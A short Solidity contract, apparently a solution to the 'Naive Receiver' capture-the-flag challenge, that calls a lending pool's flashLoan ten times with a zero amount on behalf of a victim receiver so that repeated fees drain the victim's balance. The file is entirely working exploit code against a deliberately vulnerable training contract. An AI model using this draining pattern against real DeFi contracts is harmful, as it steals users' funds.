pragma solidity ^0.6.0;

import "./NaiveReceiverLenderPool.sol";

contract Attack {

    NaiveReceiverLenderPool public pool;

    constructor (address payable _pool) public {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address payable victim) external
    {
        uint8 i;
        while (i++ < 10)
        {
            pool.flashLoan(victim, 0);
        }
    }
}